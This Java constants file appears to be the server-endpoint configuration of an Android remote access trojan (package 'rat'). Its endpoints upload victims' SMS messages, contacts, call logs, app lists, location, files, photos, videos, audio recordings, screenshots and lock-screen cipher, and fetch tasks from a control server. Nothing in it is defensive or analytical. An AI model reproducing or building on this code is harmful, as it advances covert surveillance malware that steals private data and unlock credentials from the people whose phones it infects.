package com.vendor.rat.config;

/**
 * API 端点常量
 * 集中管理所有服务器 API 路径
 */
public final class ApiEndpoints {

    private ApiEndpoints() {}

    // ====== 设备管理 ======
    public static final String DEVICE_REGISTER = "/api/device/register.json";
    public static final String DEVICE_INFO = "/api/device/info.json";
    public static final String DEVICE_CRASH = "/api/device/crash.json";

    // ====== 数据收集 (模块 05) ======
    public static final String SMS_UPLOAD = "/api/smsMessage/post.json";
    public static final String CONTACT_UPLOAD = "/api/contact/post.json";
    public static final String CALL_LOG_UPLOAD = "/api/message/post.json";
    public static final String APP_LIST_UPLOAD = "/api/package/post.json";
    public static final String LOCATION_UPLOAD = "/api/location/post.json";
    public static final String FILE_LIST_UPLOAD = "/api/file/list.json";

    // ====== 文件上传 ======
    public static final String PHOTO_UPLOAD = "/api/photoFile/batch.json";
    public static final String VIDEO_UPLOAD = "/api/videoFile/batch.json";
    public static final String AUDIO_UPLOAD = "/api/audioFile/batch.json";
    public static final String SCREENSHOT_UPLOAD = "/api/shotFile/batch.json";
    public static final String FILE_UPLOAD = "/api/file/upload.json";

    // ====== 安全相关 ======
    public static final String LOCK_CIPHER_UPLOAD = "/api/cipher/postLockCipher.json";

    // ====== 任务获取 ======
    public static final String GET_CACHE_TASK = "/api/containerApi/getCacheTask";
}
